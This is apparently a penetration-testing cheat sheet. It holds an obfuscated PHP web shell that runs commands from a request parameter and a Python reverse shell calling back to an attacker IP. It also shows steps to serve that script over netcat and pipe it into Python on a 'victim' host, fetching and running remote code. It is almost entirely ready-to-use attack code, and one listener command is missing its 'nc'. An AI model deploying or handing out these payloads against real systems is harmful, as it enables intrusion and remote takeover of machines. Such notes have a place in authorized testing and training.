## PHP
Payload: echo passthru($_REQUEST["cmd"])
```
<pre><?php eval(base64_decode('ZWNobyBwYXNzdGhydSgkX1JFUVVFU1RbImNtZCJdKTsg'));?></pre>
```

## NC + Python

Create Python reverse shell

shell.py
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.1",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Wait for connect back on Kali

```
kali@kali:~$ -nlvp 5555
```

Serve the shell from Kali

```
kali@kali:~$ nc -nvlp 4444 < shell.py
```

Get the shell from Kali and execute it on Victim

```
joe@victim:~$ nc 10.10.10.1 4444 | python
```
